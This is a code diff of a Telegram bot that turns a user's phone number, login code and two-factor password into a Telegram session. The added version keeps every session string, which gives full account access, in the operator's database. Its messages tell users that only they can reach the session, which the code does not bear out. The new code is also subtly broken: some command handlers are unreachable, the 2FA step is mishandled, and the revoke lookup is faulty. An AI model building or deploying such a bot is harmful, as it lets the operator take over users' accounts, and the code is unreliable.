@@ -1,219 +1,178 @@
 import os
-import telebot
 import asyncio
 import logging
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
-from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, AuthRestartError
+from telethon import TelegramClient, sessions
+from telethon.errors import SessionPasswordNeededError
+import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import pymongo
+from datetime import datetime
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-os.makedirs("sessions", exist_ok=True)
+# ==================== المتغيرات البيئية ====================
+TOKEN = os.environ.get("TOKEN")
+API_ID = int(os.environ.get("API_ID", 0))
+API_HASH = os.environ.get("API_HASH")
+MONGO_URL = os.environ.get("MONGO_URL")  # رابط MongoDB
 
-TOKEN = ""
-API_ID = 
-API_HASH = ""
+# ==================== اتصال MongoDB ====================
+client_mongo = pymongo.MongoClient(MONGO_URL)
+db = client_mongo["telegram_sessions"]
+collection = db["sessions"]
 
+# ==================== إعداد البوت ====================
 bot = telebot.TeleBot(TOKEN)
-sessions = {}
-loop = asyncio.new_event_loop()
+logging.basicConfig(level=logging.INFO)
 
-async def create_client(session_name):
-    logging.info(f"Creating client for session: {session_name}")
-    return TelegramClient(
-        session_name,
-        API_ID,
-        API_HASH,
-        device_model='SessionBot',
-        system_version='1.0',
-        app_version='2.0',
-        loop=loop
-    )
+# تخزين مؤقت للبيانات (لكل مستخدم)
+user_data = {}
 
-def run_async(coro):
-    future = asyncio.run_coroutine_threadsafe(coro, loop)
-    return future.result()
-
-@bot.message_handler(commands=["start"])
+# ==================== الأوامر ====================
+@bot.message_handler(commands=['start'])
 def start(message):
-    logging.info(f"Received /start from {message.chat.id}")
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("🚀 Начать", callback_data="start_session"))
-    bot.send_message(
-        message.chat.id,
-        f"Привет, {message.from_user.first_name}! 👋\n\nВы здесь, чтобы получить файл .session от своего аккаунта. Давайте начнем!",
-        reply_markup=markup
-    )
+    markup.add(InlineKeyboardButton("✅ موافق وشروط الاستخدام", callback_data="agree"))
+    markup.add(InlineKeyboardButton("📋 جلساتي المحفوظة", callback_data="my_sessions"))
+    bot.send_message(message.chat.id, 
+                     "⚠️ **تحذير:** ملف الجلسة يمنح وصول كامل لحسابك.\n"
+                     "لا ترسله لأي شخص.\n\n"
+                     "📌 الأوامر المتاحة:\n"
+                     "/start - القائمة الرئيسية\n"
+                     "/gensession - إنشاء جلسة جديدة\n"
+                     "/mysessions - عرض جلساتي المحفوظة\n"
+                     "/revoke - حذف جلسة معينة",
+                     reply_markup=markup, parse_mode='Markdown')
 
-@bot.callback_query_handler(func=lambda call: call.data == "start_session")
-def warning(call):
-    logging.info(f"User {call.message.chat.id} started session")
+@bot.message_handler(commands=['gensession'])
+def gen_session(message):
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("✅ Я понимаю условия", callback_data="accept_terms"))
-    bot.edit_message_text(
-        "⚠️ Внимание!\n\nНикому не отправляйте файл .session! Администрация бота не несёт ответственности за его использование. Вы берёте всю ответственность на себя.",
-        call.message.chat.id,
-        call.message.message_id,
-        reply_markup=markup
-    )
+    markup.add(InlineKeyboardButton("✅ موافق وشروط الاستخدام", callback_data="agree"))
+    bot.send_message(message.chat.id, 
+                     "⚠️ **تنبيه أمان:**\n"
+                     "سيتم إنشاء جلسة جديدة وحفظها في قاعدة البيانات.\n"
+                     "أنت وحدك من يستطيع الوصول إليها.\n\n"
+                     "هل توافق؟",
+                     reply_markup=markup, parse_mode='Markdown')
 
-@bot.callback_query_handler(func=lambda call: call.data == "accept_terms")
-def request_phone(call):
-    logging.info(f"User {call.message.chat.id} accepted terms")
-    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    markup.add(KeyboardButton("📲 Отправить номер", request_contact=True))
-    bot.send_message(
-        call.message.chat.id,
-        "📌 Чтобы получить файл .session, отправьте ваш номер телефона, используя кнопку ниже.",
-        reply_markup=markup
-    )
+@bot.callback_query_handler(func=lambda call: call.data == "agree")
+def agree(call):
+    bot.answer_callback_query(call.id)
+    msg = bot.send_message(call.message.chat.id, 
+                          "📱 أرسل رقم هاتفك مع المفتاح الدولي\n"
+                          "مثال: `+966501234567`\n\n"
+                          "أو اضغط /cancel للإلغاء", 
+                          parse_mode='Markdown')
+    bot.register_next_step_handler(msg, get_phone)
 
-@bot.message_handler(content_types=["contact"])
-def handle_contact(message):
-    chat_id = message.chat.id
-    phone = message.contact.phone_number
-    logging.info(f"Received contact from {chat_id}: {phone}")
-    sessions[chat_id] = {
-        "phone": phone,
-        "code": "",
-        "phone_code_hash": None,
-        "password": None,
-        "client": None
-    }
-    try:
-        client = run_async(create_client(f"sessions/{chat_id}"))
-        sessions[chat_id]["client"] = client
-        run_async(client.connect())
-        sent_code = run_async(client.send_code_request(phone))
-        sessions[chat_id]["phone_code_hash"] = sent_code.phone_code_hash
-        logging.info(f"Code sent for {phone} user {chat_id}")
-        show_code_keyboard(chat_id)
-    except AuthRestartError:
-        logging.error(f"AuthRestartError for user {chat_id}")
-        bot.send_message(chat_id, "⚠️ Ошибка авторизации. Пожалуйста, попробуйте снова.")
-    except Exception as e:
-        logging.exception(f"Critical error for user {chat_id}: {str(e)}")
-        bot.send_message(chat_id, f"❌ Критическая ошибка: {str(e)}")
-        cleanup_session(chat_id)
-
-def show_code_keyboard(chat_id):
-    markup = InlineKeyboardMarkup()
-    buttons = [InlineKeyboardButton(str(i), callback_data=f"code_{i}") for i in range(10)]
-    for i in range(0, 10, 3):
-        markup.row(*buttons[i:i+3])
-    markup.row(InlineKeyboardButton("⬅️ Удалить", callback_data="delete_digit"))
-    bot.send_message(
-        chat_id,
-        "📩 Введите код из Telegram, используя кнопки ниже:\n\nВы ввели: ",
-        reply_markup=markup
-    )
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("code_") or call.data == "delete_digit")
-def handle_code_input(call):
-    chat_id = call.message.chat.id
-    session = sessions.get(chat_id)
-    if not session:
-        logging.warning(f"Session for user {chat_id} not found")
+def get_phone(message):
+    if message.text == '/cancel':
+        bot.send_message(message.chat.id, "❌ تم الإلغاء.")
         return
-    if call.data == "delete_digit":
-        session["code"] = session["code"][:-1]
-    else:
-        digit = call.data.split("_")[1]
-        session["code"] += digit
-    logging.info(f"User {chat_id} entered code: {session['code']}")
-    if len(session["code"]) == 5:
-        process_code(chat_id)
-    else:
-        update_code_display(call.message, session["code"])
+    
+    phone = message.text.strip()
+    chat_id = message.chat.id
+    user_data[chat_id] = {'phone': phone, 'step': 'phone'}
+    
+    bot.send_message(chat_id, "⏳ جاري إرسال رمز التحقق...")
+    # تشغيل Telethon
+    asyncio.run(send_code(chat_id, phone))
 
-def process_code(chat_id):
+async def send_code(chat_id, phone):
     try:
-        session = sessions[chat_id]
-        client = session["client"]
-        run_async(client.sign_in(
-            phone=session["phone"],
-            code=session["code"],
-            phone_code_hash=session["phone_code_hash"]
-        ))
-        logging.info(f"User {chat_id} signed in with code {session['code']}")
-        send_session_file(chat_id)
+        # إنشاء عميل Telethon (بدون حفظ ملف)
+        client = TelegramClient(sessions.StringSession(), API_ID, API_HASH)
+        await client.start(phone=phone)
+        user_data[chat_id]['client'] = client
+        bot.send_message(chat_id, "🔑 أرسل رمز التحقق (5 أرقام) الذي وصل إليك في Telegram:")
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ فشل الإرسال: {str(e)}")
+
+@bot.message_handler(func=lambda m: True)
+def handle_code(message):
+    chat_id = message.chat.id
+    if chat_id not in user_data or 'client' not in user_data[chat_id]:
+        bot.send_message(chat_id, "❌ ابدأ من جديد بـ /gensession")
+        return
+    
+    code = message.text.strip()
+    asyncio.run(complete_auth(chat_id, code))
+
+async def complete_auth(chat_id, code):
+    client = user_data[chat_id]['client']
+    phone = user_data[chat_id]['phone']
+    
+    try:
+        await client.sign_in(code=code)
+        # استخراج الجلسة كنص (String Session)
+        session_string = client.session.save()
+        await client.disconnect()
+        
+        # حفظ في MongoDB
+        session_data = {
+            "user_id": chat_id,
+            "phone": phone,
+            "session_string": session_string,
+            "created_at": datetime.utcnow(),
+            "is_active": True
+        }
+        collection.insert_one(session_data)
+        
+        # إرسال الجلسة للمستخدم
+        bot.send_message(chat_id, 
+                        f"✅ **تم حفظ جلسة جديدة!**\n\n"
+                        f"📱 الرقم: `{phone}`\n"
+                        f"🆔 المعرف: {session_data['_id']}\n\n"
+                        f"🔑 **جلسة النص (String Session):**\n"
+                        f"`{session_string}`\n\n"
+                        f"⚠️ احتفظ بها بأمان! يمكنك استرجاعها بـ /mysessions",
+                        parse_mode='Markdown')
+        
+        # تنظيف
+        del user_data[chat_id]
+        
     except SessionPasswordNeededError:
-        logging.info(f"2FA enabled for user {chat_id}")
-        bot.send_message(chat_id, "🔒 Введите пароль двухэтапной аутентификации:")
-    except PhoneCodeInvalidError:
-        logging.warning(f"Invalid code for user {chat_id}")
-        bot.send_message(chat_id, "❌ Неверный код. Попробуйте снова.")
-        show_code_keyboard(chat_id)
+        bot.send_message(chat_id, "🔐 حسابك مفعل بـ 2FA. أرسل كلمة المرور:")
+        user_data[chat_id]['step'] = '2fa'
     except Exception as e:
-        logging.exception(f"Authorization error for user {chat_id}: {str(e)}")
-        bot.send_message(chat_id, f"❌ Ошибка авторизации: {str(e)}")
-        cleanup_session(chat_id)
+        bot.send_message(chat_id, f"❌ خطأ: {str(e)}")
+        await client.disconnect()
 
-@bot.message_handler(func=lambda m: sessions.get(m.chat.id, {}).get("password") is None)
-def handle_2fa_password(message):
+# ==================== عرض الجلسات المحفوظة ====================
+@bot.message_handler(commands=['mysessions'])
+def my_sessions(message):
     chat_id = message.chat.id
-    session = sessions.get(chat_id)
-    if not session:
-        logging.warning(f"Session for user {chat_id} not found in 2FA handler")
+    sessions = list(collection.find({"user_id": chat_id, "is_active": True}))
+    
+    if not sessions:
+        bot.send_message(chat_id, "📭 لا توجد جلسات محفوظة.")
         return
-    try:
-        session["password"] = message.text
-        client = session["client"]
-        run_async(client.sign_in(password=session["password"]))
-        logging.info(f"User {chat_id} signed in via 2FA")
-        send_session_file(chat_id)
-    except Exception as e:
-        logging.exception(f"2FA error for user {chat_id}: {str(e)}")
-        bot.send_message(chat_id, f"❌ Ошибка двухэтапной аутентификации: {str(e)}")
-        cleanup_session(chat_id)
+    
+    text = "📋 **جلساتك المحفوظة:**\n\n"
+    for i, sess in enumerate(sessions, 1):
+        text += f"{i}. 📱 {sess['phone']}\n"
+        text += f"   🆔 `{sess['_id']}`\n"
+        text += f"   📅 {sess['created_at'].strftime('%Y-%m-%d %H:%M')}\n\n"
+    
+    text += "\nلحذف جلسة: /revoke [المعرف]"
+    bot.send_message(chat_id, text, parse_mode='Markdown')
 
-def send_session_file(chat_id):
-    try:
-        session_path = f"sessions/{chat_id}"
-        with open(f"{session_path}.session", "rb") as f:
-            bot.send_document(
-                chat_id,
-                f,
-                caption="📂 Ваш .session файл.\n⚠️ Не передавайте его третьим лицам ! Creator: @worpli, especially for the GitHub"
-            )
-        logging.info(f"Session file sent for user {chat_id}")
-    except Exception as e:
-        logging.exception(f"Error sending file for user {chat_id}: {str(e)}")
-        bot.send_message(chat_id, f"❌ Ошибка при отправке файла: {str(e)}")
-    finally:
-        cleanup_session(chat_id)
+# ==================== حذف جلسة ====================
+@bot.message_handler(commands=['revoke'])
+def revoke_session(message):
+    chat_id = message.chat.id
+    parts = message.text.split()
+    
+    if len(parts) < 2:
+        bot.send_message(chat_id, "❌ أرسل المعرف المراد حذفه:\n`/revoke 65f3a1b2...`", parse_mode='Markdown')
+        return
+    
+    session_id = parts[1]
+    result = collection.delete_one({"_id": session_id, "user_id": chat_id})
+    
+    if result.deleted_count > 0:
+        bot.send_message(chat_id, "✅ تم حذف الجلسة بنجاح.")
+    else:
+        bot.send_message(chat_id, "❌ لم أجد جلسة بهذا المعرف.")
 
-def cleanup_session(chat_id):
-    if chat_id in sessions:
-        client = sessions[chat_id].get("client")
-        if client:
-            try:
-                run_async(client.disconnect())
-                logging.info(f"Client disconnected for user {chat_id}")
-            except Exception as e:
-                logging.exception(f"Error disconnecting client for user {chat_id}: {str(e)}")
-        del sessions[chat_id]
-        logging.info(f"Session cleaned for user {chat_id}")
-
-def update_code_display(message, current_code):
-    markup = InlineKeyboardMarkup()
-    buttons = [InlineKeyboardButton(str(i), callback_data=f"code_{i}") for i in range(10)]
-    for i in range(0, 10, 3):
-        markup.row(*buttons[i:i+3])
-    markup.row(InlineKeyboardButton("⬅️ Удалить", callback_data="delete_digit"))
-    bot.edit_message_text(
-        f"📩 Введите код из Telegram:\n\nВы ввели: {current_code}",
-        message.chat.id,
-        message.message_id,
-        reply_markup=markup
-    )
-
-if __name__ == '__main__':
-    from threading import Thread
-    Thread(target=loop.run_forever).start()
-    try:
-        logging.info("Starting bot polling")
-        bot.polling(none_stop=True)
-    except Exception as e:
-        logging.exception(f"Polling error: {str(e)}")
-    finally:
-        loop.call_soon_threadsafe(loop.stop)
+# ==================== تشغيل البوت ====================
+if __name__ == "__main__":
+    bot.polling()
